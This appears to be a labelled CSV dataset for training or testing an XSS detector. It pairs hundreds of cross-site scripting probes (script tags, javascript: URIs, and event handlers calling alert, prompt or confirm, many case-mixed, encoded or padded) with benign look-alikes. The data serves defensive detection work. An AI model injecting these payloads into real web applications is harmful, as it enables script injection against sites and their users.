payload,label
"<diV StYLE=""BaCKGrOUND-iMAGe:uRl(JavAScRipT:Alert(1))"">",1
javASCripT:voId(0),0
JavAsCRIpT:Void(0),0
cgOIdTjavascript:prompt(1)E2R,1
<ScriPT>EvAl('ALErT(1)')</scriPT>,1
%3Cimg%20onload%3Dvalidate%28%29%3E,0
WbAbPq<span onmouseover=alert(1)>TIaB0,1
zUZs<div onfocus=confirm(1)>iFUJa,1
8Z0YM<svg onclick=prompt(1)>FURrk,1
<sCRIpt>docuMent.write('<iMg SrC=x oNeRrOR=ALERT(1)>')</scRipT>,1
<DIV ONMousEoveR=highlIghT()>,0
kriSO<script>eval('alert(1)')</script>w0,1
d7v<img onfocus=alert(1)>1Q,1
<SVG oncLicK=CONFIrM(1)>,1
jAVAsCrIPT:VOId(0),0
<iMg onLOad=PrompT(1)>,1
javAscRIPT:cONfIRm(1),1
LUNelo<svg onmouseover=alert(1)>hQf,1
JAVasCriPT:conFIrM(1),1
38wxJJjavascript:void(0)N30kZ,0
<SCripT>wIndOw</ScrIPT>,1
9C0h<svg onload=confirm(1)>BjmReZ,1
<A oNLOaD=CoNfIRM(1)>,1
<Svg onfoCus=VaLIDATe()>,0
<a onMOUseOvEr=PROMPT(1)>,1
<A onfOCuS=VAlidaTE()>,0
<SpAn oNfOcUs=CoNfIrm(1)>,1
jaVAsCriPT:PrompT(1),1
JAvascrIPt:pRomPT(1),1
iFVT1Gjavascript:alert(1)H0UP5,1
"<ScRIpt>sETTIMEOut('aLERt(1)',1000)</ScripT>",1
jaVAsCripT:VOID(0),0
JAVASCriPT:ConfirM(1),1
<sVG ONMouSeOVeR=prOmPt(1)>,1
RCcqP<script>document.write('<img src=x onerror=alert(1)>')</script>Tw,1
<IMG ONfoCUs=shOwmeNU()>,0
ISS0<div onload=confirm(1)>rxYLzW,1
<svg onmouseover=alert(1,1
zL55X<script>window</script>cNGiO,1
rRGjavascript:void(0)yfse8,0
JaVASCRiPt:aLerT(1),1
<Img ONmOuSEovEr=SHOWmENU()>,0
<sPaN OnFOcuS=iNiT()>,0
<dIv onloAD=AlerT(1)>,1
<a oncliCk=ALeRT(1)>,1
<spAn ONMoUSeoVer=nOOp()>,0
twjavascript:confirm(1)9U,1
<DIV onfoCUS=cONFIRm(1)>,1
<SvG ONFOcUS=vALIdATE()>,0
"<SCRIpT>sEtTImeouT('alERT(1)',1000)</scRIpT>",1
<iMg ONfocus=ALert(1)>,1
ydA5<a onload=prompt(1)>rRoGy,1
acaTG<a onclick=highlight()>8mZ,0
<img onfocus=prompt,1
<SVg OnFocUS=noOP()>,0
<DiV onfoCUs=pROmPt(1)>,1
jaVAsCRIPt:AlerT(1),1
yzLUT<svg onfocus=confirm(1)>15G73,1
IQjavascript:prompt(1)CrqP,1
<scRiPT>DocUMEnT.wrIte('<IMG SRC=X oneRRoR=alerT(1)>')</sCRiPt>,1
y2tJ4g<span onclick=prompt(1)>cuyg6,1
SfZ3Q<a onfocus=alert(1)>mpnQ,1
YJ<a onload=alert(1)>iToLQH,1
<SCRIPT>EVAL('ALeRT(1)')</sCRIPt>,1
<scrIpT>DOCumEnT.wrItE('<iMG SRC=x oNERRoR=aLErt(1)>')</ScRIPt>,1
vm4<div onclick=prompt(1)>0msQ,1
jAvAScRIPt:pRoMpt(1),1
javaSCripT:CONFIRM(1),1
<SCrIpT>DOCUmeNt.writE('<IMG Src=x OneRrOR=AlErt(1)>')</sCrIpT>,1
JaVascRIPt:VOID(0),0
oJWA<img onclick=alert(1)>1X,1
dvmp4<img onmouseover=prompt(1)>lrer,1
QXLce6<div onload=prompt(1)>mKhr,1
<sPAN oNLoaD=prompt(1)>,1
utWy<a onmouseover=noop()>PxM,0
AndJr<script>window</script>6kdFB,1
javAscRipT:Void(0),0
<span onclick=con,1
jaVAsCrIPt:pRoMpT(1),1
<scrIPt>WIndOW</scRiPt>,1
<Span oNMoUseovER=INit()>,0
JAvascRIpt:CoNfiRM(1),1
<svg OnfOCUS=AleRT(1)>,1
c0K7<script>window</script>SDUns,1
jgQQv<div onfocus=showMenu()>xbr8,0
<diV ONfOcus=hiGhLigHT()>,0
CnSE<div onfocus=validate()>suq,0
mo<svg onload=alert(1)>2z,1
IXJHE<svg onload=init()>37PPd,0
5Bjavascript:confirm(1)l0qnP,1
<ScRIpT>doCUMent.wrITE('<img SrC=x OnerRor=alert(1)>')</ScrIPt>,1
<DIv OnmOuseoVeR=IniT()>,0
<DIv ONFOCus=aLerT(1)>,1
jAvascRipt:VOID(0),0
<svg onload=promp,1
<span ONFoCuS=pROMpt(1)>,1
<Img oNMOUseOVeR=Confirm(1)>,1
<sCRIpT>eval('ALerT(1)')</ScRipT>,1
<dIV onmOusEoveR=NOoP()>,0
RdXbjavascript:confirm(1)VIhlD,1
JaVAscRiPT:ConfIrM(1),1
"<SCRIpt>sETTIMEOuT('aleRT(1)',1000)</sCRiPt>",1
<a onmOuseOVEr=VALiDatE()>,0
<ScrIpT>dOCuMeNt.wRitE('<imG sRc=X onErrOr=ALERT(1)>')</SCRipt>,1
6ojavascript:void(0)g9Uj,0
jAVAscRiPt:PrOMpT(1),1
<a ONClick=AleRT(1)>,1
Acf<img onmouseover=noop()>Nva,0
OgBjavascript:confirm(1)58Ss,1
<iMG OnfoCUS=CONfIrM(1)>,1
<sVG OncLiCK=AlERt(1)>,1
<A ONCLicK=noOP()>,0
<IMG OnfOcus=coNfIrM(1)>,1
<div oNcLIck=PROMpt(1)>,1
<iMG onfoCuS=nOop()>,0
zT<span onload=confirm(1)>WiOkpa,1
<iMG oNMoUSeOver=alert(1)>,1
JAvaScRiPt:void(0),0
<Div onLOAd=PROmPT(1)>,1
wUT<div onload=noop()>GY,0
<sVg ONLOAd=prOmPt(1)>,1
<IMg ONFocUs=coNfIRM(1)>,1
3CqRa<img onmouseover=highlight()>KlN2,0
<A oncliCK=PrOmPT(1)>,1
<img onfocus=prompt(1)>,1
Fo<div onfocus=highlight()>xs39,0
<sCrIpT>eVAL('ALerT(1)')</sCRIpt>,1
<diV OncLick=CoNFIrM(1)>,1
JavasCRiPt:cONFIRM(1),1
<A ONLOad=pROmpt(1)>,1
Yy<svg onclick=alert(1)>qxZ,1
rnn<div onclick=noop()>H1KJ,0
JAVascRiPT:PRoMpt(1),1
JaVascriPT:ConFiRm(1),1
<SpAn ONLOaD=promPt(1)>,1
<script>window</scri,1
IkGmya<script>window</script>bXdh,1
"<ScriPt>SetTImEouT('ALeRt(1)',1000)</scRIpT>",1
<SpAN OnClicK=INIt()>,0
<IMg oNlOaD=PrOMpT(1)>,1
IHyL6<a onclick=validate()>ntWZhm,0
<SpAn ONcLICK=inIt()>,0
<sVg oNlOad=shOwmENu()>,0
mDnRE4<span onfocus=prompt(1)>5h1,1
OMLjavascript:alert(1)D70oLf,1
JAvAScRiPt:alErt(1),1
<dIV onClICK=PrOMPt(1)>,1
JavASCRipt:CONFirM(1),1
zB<div onclick=confirm(1)>yN,1
"fDvXO<script>setTimeout('alert(1)',1000)</script>MGlP",1
<iMg OncLicK=ALerT(1)>,1
<svG onlOAd=conFiRM(1)>,1
Xr<svg onclick=alert(1)>nD4,1
<SCrIpt>docuMent.wRITe('<imG src=x onerror=AlerT(1)>')</sCRIpt>,1
<A OnLoad=hiGhlIGHt()>,0
JaVASCrIpt:vOId(0),0
<ScRIpt>eVal('ALERt(1)')</sCriPT>,1
<sPAn OnLoaD=PrOMpt(1)>,1
<scrIpT>WinDoW</SCriPt>,1
JavasCRIPt:aLERT(1),1
JAvAscRIpt:ALeRT(1),1
<img onfocus=pr,1
<imG OnfOcus=NooP()>,0
<a ONcLicK=HIgHLIghT()>,0
<A onMoUseoVeR=coNFIrM(1)>,1
<SvG OnlOad=NOOP()>,0
<imG ONMousEoveR=NoOp()>,0
<svG onfoCuS=Alert(1)>,1
<A ONlOAD=noOP()>,0
<SpAN oNMoUseOVer=PrOMpt(1)>,1
JoBaWc<svg onfocus=validate()>ht6by,0
<sCrIPT>doCUMENT.WRiTe('<ImG srC=x OnerroR=alErt(1)>')</SCRipt>,1
F6<svg onclick=confirm(1)>wI,1
jAVASCRiPt:AlERT(1),1
"<scRIpT>sEttImeOut('alERt(1)',1000)</Script>",1
JaMLGjavascript:prompt(1)69,1
<a OnmouseOveR=ConfIrM(1)>,1
jaVAsCRIpt:VoId(0),0
Ttjavascript:alert(1)Kj,1
<svg onclick=confir,1
<a OnfoCUS=pRoMpt(1)>,1
xW8AhXjavascript:prompt(1)NyfQe,1
<img OnCLICk=NoOp()>,0
hGVzj<svg onmouseover=showMenu()>pm,0
<ScrIpt>evAl('aLeRT(1)')</sCrIpT>,1
<Img oNLoAD=pROMpt(1)>,1
<a ONfOcus=pRomPT(1)>,1
<ScRiPt>WIndOW</sCRiPT>,1
<SpaN oNFoCus=NooP()>,0
<SCriPT>wINDow</scrIpT>,1
<SPan ONLoad=InIT()>,0
<SPAn oNfOCuS=Noop()>,0
<SpAn ONLoaD=noOp()>,0
4mDo3E<script>eval('alert(1)')</script>ML5b0B,1
<DIV oNloAd=highLIgHT()>,0
<Img oNLoad=PRomPt(1)>,1
5L5MDB<span onfocus=validate()>1vAbX,0
<IMG ONlOAD=ALerT(1)>,1
<SPAN onClIcK=Init()>,0
<IMg oNmoUSeoVeR=hiGhliGhT()>,0
ds9Oejavascript:void(0)8w,0
fL<span onfocus=showMenu()>BllV,0
r1pjavascript:alert(1)ZvjSC,1
jaVasCRipT:conFIrM(1),1
<img onfocus=noop()>,0
HpI<img onclick=noop()>TRE,0
<IMg onfoCUS=sHoWmEnU()>,0
<svg onfocus=showMenu(),0
<SCRipT>docuMent.wriTe('<ImG Src=X OneRrOR=Alert(1)>')</scrIPt>,1
<sCrIPt>EVaL('AleRT(1)')</SCRiPT>,1
"<scriPT>seTTImeouT('ALERT(1)',1000)</sCrIpT>",1
<SVG onmoUSEOver=nOOP()>,0
<svG oNMOUSeoVER=hIgHLigHt()>,0
TiH<span onclick=prompt(1)>Ne8Jy,1
<svg OncLick=coNfiRM(1)>,1
<SpaN OnFocus=VAliDaTE()>,0
<a onmOuSEOver=vALidAte()>,0
<SpAn oNFocUS=AleRT(1)>,1
<ScRiPT>WIndOW</scRiPt>,1
<a onfocus=promp,1
<SvG oNfOcUs=CoNFIRm(1)>,1
<spAn oNMOusEoVer=NoOP()>,0
<div oNcLick=NOOp()>,0
<sPAN ONLoaD=ALErt(1)>,1
<div ONcLiCK=shoWMEnu()>,0
dC<svg onmouseover=prompt(1)>6tYet,1
<img ONCLICk=aLErT(1)>,1
vbOc8<a onmouseover=confirm(1)>oVWw,1
<A ONFOcuS=ShOWMEnu()>,0
"<sCriPT>sEtTimeoUT('ALERt(1)',1000)</ScrIPt>",1
jAVaSCrIPT:Void(0),0
JAvAScrIPt:VoID(0),0
jAvaSCRIpt:cOnfirM(1),1
<IMg OnFOcuS=cOnfiRm(1)>,1
javascrIpt:prOmPt(1),1
<SPAN OnmOuseoVEr=PrOmpT(1)>,1
iU518<script>window</script>HmGc2l,1
<svg oncLicK=conFirM(1)>,1
<A oNmoUseOvEr=SHowMenu()>,0
<a ONmOuSeOver=PrOmPT(1)>,1
<SPAN ONFocuS=ALERt(1)>,1
<sCriPt>evAL('alERT(1)')</scRiPT>,1
<Img onCLICk=confIRM(1)>,1
V4X<div onfocus=prompt(1)>AzQ,1
javAsCRIPt:VoiD(0),0
<A onLOaD=pROmPT(1)>,1
<sVG OnmoUsEOver=higHlIGHt()>,0
<A OnlOaD=cONFirm(1)>,1
javasCRiPT:vOid(0),0
"<scRIpt>sETTiMeoUT('aleRt(1)',1000)</SCRipT>",1
<SPAn oNmOUsEOVEr=COnFIrm(1)>,1
jC<div onmouseover=prompt(1)>Rb,1
<iMG onFocuS=VAlIDAtE()>,0
<Svg oncLick=PRoMPt(1)>,1
<DiV onLOAd=nOoP()>,0
DoXoG<script>eval('alert(1)')</script>M2a8o,1
eRo<script>eval('alert(1)')</script>zrI6,1
AX25<img onclick=alert(1)>UN9b,1
<Div oNMousEOVer=vAlIDaTE()>,0
<Svg ONFOcuS=HiGhlIGhT()>,0
<SPaN OnclIcK=ALErT(1)>,1
9e71javascript:void(0)WoLHL,0
JavAscRiPt:ALErt(1),1
<DIv oNLOaD=aLErT(1)>,1
<a onfocus=c,1
jAVASCRipT:AleRT(1),1
<svG oNlOad=ValIDATe()>,0
<a onmOuseOveR=HIGHLIgHT()>,0
<A oNFOCUs=prOmPt(1)>,1
jAvASCRipt:ConFirM(1),1
<scRIpt>docUMenT.wRite('<IMG sRc=X OnErroR=AlerT(1)>')</sCriPT>,1
"<SCRiPt>sEttimeoUt('alErt(1)',1000)</sCRIPT>",1
526<svg onfocus=alert(1)>biNR,1
jAvAScriPt:PRompt(1),1
gfE<span onclick=noop()>Avlgp,0
<ScRipt>DOcUMEnt.write('<Img srC=X onerroR=aLERT(1)>')</scrIpT>,1
JavASCRIPt:PRoMPt(1),1
<iMG ONclICK=NoOp()>,0
<script>window</sc,1
RzUXijavascript:prompt(1)CH3,1
"6lcvm<script>setTimeout('alert(1)',1000)</script>yo",1
<Img ONFoCUs=highLIGHT()>,0
<DIV ONclICk=HIghLIGhT()>,0
<SpaN oNCLicK=coNFIrm(1)>,1
TE6Wjavascript:confirm(1)qH3,1
jaVASCRIpT:VOID(0),0
<SPAn ONmoUSEOVer=ALert(1)>,1
<SpAN ONFOcus=cOnfIrm(1)>,1
<A ONload=alERT(1)>,1
PGsi6e<div onload=confirm(1)>00,1
<div onCLICk=ValIDaTe()>,0
5q<svg onclick=highlight()>c1t,0
uJ2y<img onmouseover=prompt(1)>tXd,1
<spAN Onclick=Init()>,0
OR<svg onload=highlight()>39XcQy,0
Rq<div onfocus=confirm(1)>6rZMU,1
<SvG OnLOAd=ALErt(1)>,1
<sCRIpt>eVAL('AlErT(1)')</sCRIpT>,1
<sVG oNmOUSeOveR=proMpT(1)>,1
&lt;img src=x onerror=alert(1)&gt;,1
"OiKPS<script>setTimeout('alert(1)',1000)</script>4Ii6N",1
<SVg onLOAD=aLeRt(1)>,1
<SPAN oNmOuSEoVER=PrOmpT(1)>,1
CyuihG<a onclick=noop()>8IiQY,0
<img ONFOCUS=Confirm(1)>,1
p6PUUjavascript:prompt(1)Uz,1
rpNJA<a onfocus=validate()>WP,0
<A ONFOCus=COnFIrM(1)>,1
<SCRIpt>doCUMENt.wRitE('<IMG SRC=X oNeRROr=ALERT(1)>')</sCrIPt>,1
<imG ONclicK=cOnFirM(1)>,1
JAvasCrIpT:VoID(0),0
jaVaScRipt:conFirm(1),1
jAVasCripT:aLeRt(1),1
z2nEJN<span onmouseover=confirm(1)>83MP,1
<script>document.write('<img src=x onerror=a,1
jAvaScrIpt:VoId(0),0
QOSszx<img onclick=confirm(1)>R8E,1
<A onlOaD=conFIRm(1)>,1
<diV OnClIcK=vAliDatE()>,0
<sCrIpt>dOCuMENt.WRITe('<imG SRC=x OneRroR=aLErT(1)>')</SCriPt>,1
gCxxjavascript:void(0)rJNJ,0
<scRiPt>eVal('ALeRt(1)')</sCRiPt>,1
mtROAjavascript:prompt(1)VyNCi,1
<span onclick=confi,1
<A oNCLick=cOnfiRM(1)>,1
<img OnFOCUs=CoNFIRm(1)>,1
<SVg ONMOUSeoVeR=VAliDaTe()>,0
jAVAsCRiPT:voId(0),0
2N<svg onmouseover=prompt(1)>9kwj6,1
<svg oNcLICk=shoWmEnu()>,0
<iMg oNFOcUS=pRomPT(1)>,1
<img onclick=prompt(1,1
uaT<a onfocus=alert(1)>lw24l,1
<SpAN ONlOad=pROMpT(1)>,1
<SPAn onLOaD=AleRt(1)>,1
<div onclic,1
<DiV ONFocUS=iNit()>,0
<ScripT>dOCumEnT.WriTe('<imG SrC=x OnerroR=AleRT(1)>')</scRIpt>,1
"mX4Go<script>setTimeout('alert(1)',1000)</script>38W1lF",1
<img ONLoAd=ALeRt(1)>,1
<SVG ONLoaD=nooP()>,0
SFKe<span onclick=showMenu()>W8Z1p9,0
Gcjavascript:void(0)173S,0
<ScriPT>docUMEnt.WRitE('<IMG SRC=X OneRRoR=aLErt(1)>')</scRipt>,1
jAVasCRiPT:CONfirM(1),1
DxqLH<img onclick=prompt(1)>f6Cb,1
bljavascript:prompt(1)Gx,1
<scRipT>Eval('alERt(1)')</sCript>,1
<svg onfocus=valida,0
Zla94<span onmouseover=alert(1)>udJ,1
WM1gi<script>eval('alert(1)')</script>knSM,1
MP<a onclick=validate()>b5gj,0
<svg onclICK=vAlIdATe()>,0
DB<span onload=prompt(1)>WdbZ4,1
Rvcjavascript:void(0)rvRm,0
<sVG ONmOuSeOVEr=pRompt(1)>,1
<a oNCliCK=sHowmenU()>,0
CsKvjavascript:alert(1)qghZTN,1
jAVasCRIpT:promPT(1),1
<Span onclICk=SHoWMeNU()>,0
<A oNcliCk=prOmPt(1)>,1
<script>dOcumenT.WrItE('<iMG Src=X oNErRoR=alERt(1)>')</sCRIPt>,1
<iMG ONCLicK=hIgHLIght()>,0
0A<img onfocus=noop()>r7Qbs,0
kXATnjavascript:confirm(1)RE8ix,1
JAVAscRIPT:ALert(1),1
<div onload=prompt(1),1
<DIv ONClICk=iniT()>,0
AFncD<img onmouseover=showMenu()>XUMD,0
GhH<span onmouseover=init()>zM7wAu,0
<scrIPT>WiNDOW</ScRIpt>,1
Ppz<script>eval('alert(1)')</script>BpS,1
Ir<span onfocus=init()>8n6k,0
<ImG OnClIck=CoNfirm(1)>,1
uTicUP<svg onclick=prompt(1)>jfCJDq,1
<DIV oNClICk=highligHT()>,0
<diV ONFOCuS=vAliDatE()>,0
G9Y0<a onfocus=confirm(1)>Udgh,1
<a ONfoCus=ShoWMEnU()>,0
<IMG oNcliCk=SHOWMEnu()>,0
<IMG oNcliCk=vaLIdAtE()>,0
bp<script>window</script>od4Rjn,1
<SCriPt>evAL('ALErt(1)')</ScRIPt>,1
OWAM<span onmouseover=alert(1)>wjBEh,1
JavasCriPT:prOmPT(1),1
dmZjavascript:void(0)DKz,0
<diV onLoAd=ALERt(1)>,1
<DiV ONclICk=aLert(1)>,1
<img onclick=pro,1
<sCRIPt>wiNDOw</scRIpt>,1
<A onLoAD=PrOMpT(1)>,1
<SVg OnmouSEOver=ALErT(1)>,1
MU<a onmouseover=alert(1)>pQdr,1
<ImG ONLoad=PROMpT(1)>,1
96pD<img onmouseover=prompt(1)>2Nf,1
j7RI<a onfocus=prompt(1)>A0mi,1
<DIV onMOUSEOVEr=iniT()>,0
3Vjavascript:void(0)MEyk,0
<A OnmouSEOver=ShoWMENU()>,0
ycjavascript:prompt(1)M0Z,1
<ScRipt>DoCuMent.wRITe('<iMG SRC=x oNerrOR=ALerT(1)>')</sCRiPt>,1
<sCripT>WiNDoW</SCRipT>,1
<DiV ONcLICK=HiGHlight()>,0
JavAscRipt:VoId(0),0
Z98G0<img onfocus=prompt(1)>Xh,1
<sVg OnMoUSeovER=hiGhligHt()>,0
JAvaSCriPt:PromPt(1),1
GbnRjavascript:void(0)ut4PIl,0
<DIv OnMOuseOVEr=coNFIrM(1)>,1
JAVAScrIpT:PRompt(1),1
<Svg ONCLICK=cOnfirM(1)>,1
jAVASCRiPt:aLeRt(1),1
<A OnLoaD=noop()>,0
JAvAsCrIpT:ALert(1),1
"<sCrIPT>SeTtImEoUT('aLerT(1)',1000)</SCrIPt>",1
C9u<svg onload=prompt(1)>4YC,1
<SCriPT>dOcUMEnT.Write('<iMG src=X ONerROR=alert(1)>')</sCripT>,1
0EfdYwjavascript:alert(1)mj,1
vQh<a onclick=noop()>y5Q,0
xqkjavascript:prompt(1)MZVKer,1
<sVG onClIcK=sHOWMEnu()>,0
<a onload=hig,0
jAvASCrIpT:AleRT(1),1
<ImG oNmOuseOVEr=nooP()>,0
<SCriPT>EVAl('AlErt(1)')</scrIPT>,1
PKGjavascript:void(0)ePXDB,0
<a oNFOCUs=HIgHlIGhT()>,0
<SCRIpT>WINdOw</scRIpt>,1
JavAsCript:CoNFiRM(1),1
&lt;span onmouseover=showMenu()&gt;,0
<DIv OnClICk=pRoMpT(1)>,1
OAGT7<svg onfocus=prompt(1)>YNn1,1
<iMg oNFocus=cOnfIRM(1)>,1
<ScriPT>WInDow</scRipt>,1
wUgNijavascript:prompt(1)RhroJM,1
7LuXjavascript:void(0)Zbe,0
"<sCriPt>sEttIMEOUT('aleRT(1)',1000)</sCRIpt>",1
GX8s<a onfocus=confirm(1)>vH1Iy,1
<IMG ONmouseoVER=coNFIRm(1)>,1
68<span onfocus=alert(1)>2y,1
%253Cdiv%2520class%253D%2527container%2527%253E,0
%3Cspan%20onclick%3DshowMenu%28%29%3E,0
jAvaScRIPT:VoiD(0),0
"<scRiPt>SETtIMeOuT('alert(1)',1000)</SCripT>",1
<SVg onCLick=nOoP()>,0
<svg oNload=vaLIdate()>,0
<SPAn OnmOuseover=proMpt(1)>,1
SvAJ3Z<a onload=alert(1)>VTipcZ,1
<SVG ONMOUseovER=shOwmENu()>,0
"nB<script>setTimeout('alert(1)',1000)</script>w12",1
QZ<script>document.write('<img src=x onerror=alert(1)>')</script>ss6,1
XRTA<a onmouseover=prompt(1)>O3sJh,1
<dIV onCLicK=ConFIRm(1)>,1
<Div onMouseOVEr=hIGhlIGhT()>,0
<svg OncLIcK=ALErt(1)>,1
<span onload=prompt(1),1
<DIV ONLOad=pROMPt(1)>,1
7AmDa9<a onfocus=prompt(1)>ktc3K,1
<SpAN onfOCus=ShoWmeNU()>,0
javaScriPt:VOID(0),0
<SVG OnLOAd=iNIT()>,0
<SCriPt>evaL('AlERt(1)')</ScRipT>,1
mL7lw<span onclick=validate()>gi,0
kbViJ<script>eval('alert(1)')</script>VOB8,1
<script>docUmeNT.writE('<IMG sRC=x oNeRror=AlErT(1)>')</ScRipt>,1
<SPan OnlOad=PROMpT(1)>,1
BagOjavascript:confirm(1)QS,1
TmXA<img onload=validate()>9Y,0
javAScrIpt:cONfIRm(1),1
<span OnClIcK=PrOmPT(1)>,1
"jzuaCz<script>setTimeout('alert(1)',1000)</script>ATP",1
<script>doCUMEnt.WrIte('<img Src=x onerRor=AlERt(1)>')</scrIPT>,1
<svg OnCLIck=ProMPt(1)>,1
javAscrIPT:ConFIRM(1),1
9enx<svg onload=prompt(1)>UGz1f,1
<div onload=s,0
<sVg OnFocUs=ShoWmeNU()>,0
<dIV OnLOad=VALidaTE()>,0
<sVG onlOAD=iNiT()>,0
mHJs<script>eval('alert(1)')</script>MpJGs,1
PfhQC<script>eval('alert(1)')</script>VJS,1
iAc1NV<span onmouseover=alert(1)>N7D,1
<svg ONFOCUs=NoOP()>,0
<span onload=alert(,1
<sPan ONLoAD=cONfIrM(1)>,1
rsq<svg onfocus=validate()>fjQgDf,0
"6M<script>setTimeout('alert(1)',1000)</script>XtI",1
<a ONFOcUs=pRomPt(1)>,1
<SPAn OnLOAd=VaLIdAte()>,0
fYvz6<div onfocus=highlight()>kAqGP7,0
<DIv ONfOCus=alerT(1)>,1
<SCRipt>DoCumENt.wrITE('<iMg sRc=X OnError=aLERt(1)>')</ScrIpt>,1
z1QE<script>window</script>GeB,1
&lt;svg onmouseover=noop()&gt;,0
<img onclick=prompt(1)>,1
<DIv onLOAD=coNfIrM(1)>,1
JaVasCripT:AlErT(1),1
<A ONmOusEovEr=highlIGHt()>,0
JaVAsCRiPt:prOmpt(1),1
XJmjavascript:void(0)615,0
QMK0Njavascript:void(0)xJCAF8,0
<sPAN oNlOaD=shoWmENu()>,0
TP8o<a onclick=confirm(1)>c4,1
<a oNMOuseOVER=HigHLigHt()>,0
<SVg onmOUseOver=cONFiRm(1)>,1
kEP<script>window</script>pbdeG1,1
<SVg onfocUS=aLErt(1)>,1
jU6njavascript:alert(1)kxFz,1
h281S0javascript:confirm(1)2NdJ,1
